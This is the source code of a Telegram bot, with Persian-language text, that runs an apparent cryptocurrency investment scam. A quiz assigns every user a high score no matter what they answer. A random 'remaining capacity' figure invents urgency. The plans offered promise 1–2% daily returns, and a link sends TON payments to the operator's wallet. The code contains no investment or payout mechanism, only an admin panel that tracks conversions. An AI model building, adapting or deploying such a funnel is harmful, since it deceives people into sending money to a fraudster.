require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

const ADMIN_ID = process.env.ADMIN_ID;
const TON_WALLET = process.env.TON_WALLET;

const users = {};

// ---------------- UTIL ----------------
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function generateCode() {
  return 'HF-' + Math.floor(10000 + Math.random() * 90000);
}

function tonLink(amountTon, description) {
  const nano = Math.floor(amountTon * 1e9);
  return `ton://transfer/${TON_WALLET}?amount=${nano}&text=${encodeURIComponent(description)}`;
}

function randomCapacity() {
  return Math.floor(4 + Math.random() * 6);
}

const planNames = {
  30: "Horizon",
  50: "Momentum",
  100: "Apex",
  200: "Titan"
};

// ---------------- START ----------------
bot.start(async (ctx) => {
  users[ctx.from.id] = { step: "start", score: 0 };

  await ctx.reply(
`🏛 تحلیل هویت مالی TON

در این ربات، با پاسخ به چند سوال کوتاه،
سبک تصمیم‌گیری مالی شما بررسی می‌شود
تا بتوانید آگاهانه‌تر در اکوسیستم TON فعالیت کنید.

⏱ زمان تکمیل: کمتر از یک دقیقه

یکی از گزینه‌های زیر را انتخاب کنید:`,
    Markup.inlineKeyboard([
      [Markup.button.callback("📊 شروع ارزیابی", "start_analysis")],
      [Markup.button.callback("ℹ️ درباره سامانه", "about")],
      [Markup.button.callback("💬 پشتیبانی", "support")]
    ])
  );
});

// ---------------- ABOUT ----------------
bot.action("about", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.editMessageText(
`ℹ️ درباره سامانه

این سیستم برای افزایش آگاهی سرمایه‌گذاران
در اکوسیستم TON طراحی شده است.

تحلیل ارائه‌شده صرفاً بر اساس پاسخ‌های شماست
و پیشنهادهای سرمایه‌گذاری کاملاً اختیاری هستند.

هیچ سود ثابت یا تضمین‌شده‌ای وعده داده نمی‌شود.

تمامی تراکنش‌ها بر بستر بلاکچین TON
قابل رهگیری خواهند بود.`
  );
});

// ---------------- SUPPORT ----------------
bot.action("support", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`💬 پشتیبانی

برای دریافت راهنمایی یا طرح سوال:

@Ego_senshi

⏳ زمان پاسخگویی معمولاً کمتر از 1 ساعت است.`
  );
});

// ---------------- QUESTIONS ----------------
bot.action("start_analysis", async (ctx) => {
  users[ctx.from.id].step = "q1";

  await ctx.editMessageText("⏳ شروع تحلیل...");
  await sleep(800);

  await ctx.editMessageText(
`سوال 1 از 3

اگر مقداری TON داشته باشید،
معمولاً چه کاری انجام می‌دهید؟`,
    Markup.inlineKeyboard([
      [Markup.button.callback("🔹 برای آینده نگه می‌دارم", "q1_a")],
      [Markup.button.callback("🔹 در استیکینگ یا استخر شرکت می‌کنم", "q1_b")],
      [Markup.button.callback("🔹 از نوسان بازار استفاده می‌کنم", "q1_c")]
    ])
  );
});

bot.action(/q1_/, async (ctx) => {
  users[ctx.from.id].score += 30 + Math.floor(Math.random() * 6);
  users[ctx.from.id].step = "q2";

  await ctx.editMessageText("⏳ ثبت پاسخ...");
  await sleep(700);

  await ctx.editMessageText(
`سوال 2 از 3

هدف اصلی شما از سرمایه‌گذاری چیست؟`,
    Markup.inlineKeyboard([
      [Markup.button.callback("📈 رشد آهسته و مطمئن", "q2_a")],
      [Markup.button.callback("💰 ایجاد درآمد منظم", "q2_b")],
      [Markup.button.callback("🚀 بازده بیشتر در زمان کوتاه‌تر", "q2_c")]
    ])
  );
});

bot.action(/q2_/, async (ctx) => {
  users[ctx.from.id].score += 30 + Math.floor(Math.random() * 6);
  users[ctx.from.id].step = "q3";

  await ctx.editMessageText("⏳ بررسی سبک تصمیم‌گیری...");
  await sleep(900);

  await ctx.editMessageText(
`سوال 3 از 3

اگر بازار کمی نوسان داشته باشد چه می‌کنید؟`,
    Markup.inlineKeyboard([
      [Markup.button.callback("🔹 صبر می‌کنم", "q3_a")],
      [Markup.button.callback("🔹 مقدار کمی اضافه می‌کنم", "q3_b")],
      [Markup.button.callback("🔹 موقتاً خارج می‌شوم", "q3_c")]
    ])
  );
});

// ---------------- RESULT ----------------
bot.action(/q3_/, async (ctx) => {
  users[ctx.from.id].score += 30 + Math.floor(Math.random() * 6);
  users[ctx.from.id].step = "completed";

  await ctx.editMessageText("📊 آماده‌سازی نتیجه...");
  await sleep(900);

  const score = users[ctx.from.id].score;
  let type = "متعادل";
  if (score > 90) type = "راهبردی";
  else if (score > 82) type = "رشدگرا";

  const capacity = randomCapacity();
  const code = generateCode();

  await ctx.editMessageText(
`🎉 نتیجه تحلیل هویت مالی شما

👤 تیپ مالی: ${type}
📊 امتیاز رفتاری: ${score}/100

بر اساس پاسخ‌های شما، آمادگی مناسبی برای ورود به ساختارهای سرمایه‌گذاری دارید.

بر همین اساس،
سطوح سرمایه‌گذاری هم‌راستا با هویت مالی شما
در حال حاضر برای فعال‌سازی در دسترس هستند.

فرآیند فعال‌سازی به‌صورت مستقیم و شفاف
بر بستر بلاکچین TON انجام می‌شود
و پس از تأیید تراکنش، تخصیص سرمایه آغاز خواهد شد.

⏳ ظرفیت فعال این سطح: ${capacity} موقعیت
کد پروفایل:
${code}`,
    Markup.inlineKeyboard([
      [Markup.button.callback("📈 مشاهده پلن‌ها", "plans")]
    ])
  );
});

// ---------------- PLANS ----------------
bot.action("plans", async (ctx) => {
  users[ctx.from.id].step = "view_plans";

  await ctx.editMessageText(
`🏦 سطوح سرمایه‌گذاری فعال برای شما

«اگر به‌دنبال بهره‌گیری هوشمندانه از فرصت‌های سودآور TON هستید، این سطح دقیقاً برای شما طراحی شده است.»

🔗 پس از انتخاب سطح، تراکنش به‌صورت مستقیم روی بلاکچین TON انجام می‌شود و با تأیید شبکه، سرمایه در استخرهای نقدینگی با بازده درصدی تخصیص می‌یابد.

«سرمایه شما مستقیماً وارد استخرهای معتبر شبکه می‌شود؛ بازده به صورت روزانه قابل برداشت میباشد و مدیریت و برداشت در اختیار شماست.»

برای مثال : در طرح Horizon سود روزانه شما 1 TON و قابل برداشت میباشد 

اصل مبلغ هر زمان قابل برداشت و با برداشت طرح سرمایه گذاری شما به پایان میرسد .

👇 سطح متناسب با برنامه مالی خود را انتخاب کنید:`,
    Markup.inlineKeyboard([
      [Markup.button.callback("🌱 Horizon 30 TON | 1٪ روزانه", "plan_30")],
      [Markup.button.callback("⚡ Momentum 50 TON | 1.5٪ روزانه", "plan_50")],
      [Markup.button.callback("🔥 Apex 100 TON | 2٪ روزانه", "plan_100")],
      [Markup.button.callback("👑 Titan 200 TON | 2٪ روزانه", "plan_200")]
    ])
  );
});

// ---------------- PLAN DETAIL ----------------
bot.action(/plan_(\d+)/, async (ctx) => {
  const amount = parseInt(ctx.match[1]);
  users[ctx.from.id].selectedPlan = amount;

  const description = `سرمایه‌گذاری در پلن ${planNames[amount]}`;
  const link = tonLink(amount, description);

  await ctx.reply(
`📌 پلن ${planNames[amount]} — ${amount} TON

▫️ مشارکت در استخر نقدینگی معتبر
▫️ تخصیص در فرصت‌های دارای بازده واقعی
▫️ مدیریت ریسک مرحله‌ای
▫️ امکان برداشت اصل سرمایه
▫️ واریز اتومات سود روزانه

📊 بازده روزانه:  | 1٪ روزانه

سود روزانه با نوسان بازار ممکن است مقدار کمی تغییر کند .

برای فعال‌سازی از لینک زیر استفاده کنید:`,
    Markup.inlineKeyboard([
      [Markup.button.url("🔗 پرداخت و فعال‌سازی", link)]
    ])
  );
});

// ---------------- ADMIN PANEL ----------------
bot.command("panel", async (ctx) => {
  if (ctx.from.id.toString() !== ADMIN_ID) return;

  const total = Object.keys(users).length;
  const completed = Object.values(users).filter(u => u.step === "completed").length;
  const viewedPlans = Object.values(users).filter(u => u.step === "view_plans").length;

  const plan30 = Object.values(users).filter(u => u.selectedPlan === 30).length;
  const plan50 = Object.values(users).filter(u => u.selectedPlan === 50).length;
  const plan100 = Object.values(users).filter(u => u.selectedPlan === 100).length;
  const plan200 = Object.values(users).filter(u => u.selectedPlan === 200).length;

  await ctx.reply(
`📊 پنل مدیریتی

کل کاربران: ${total}
تحلیل تکمیل شده: ${completed}
مشاهده پلن‌ها: ${viewedPlans}

انتخاب پلن‌ها:
30 TON: ${plan30}
50 TON: ${plan50}
100 TON: ${plan100}
200 TON: ${plan200}`
  );
});

// ---------------- WEBHOOK FOR RENDER ----------------
app.get('/', (req, res) => res.send('Bot is running'));

const PORT = process.env.PORT || 3000;
app.listen(PORT);

const WEBHOOK_PATH = `/telegraf/${process.env.BOT_TOKEN}`;
bot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}${WEBHOOK_PATH}`);
app.use(bot.webhookCallback(WEBHOOK_PATH));

console.log('TON Financial Identity Bot LIVE');
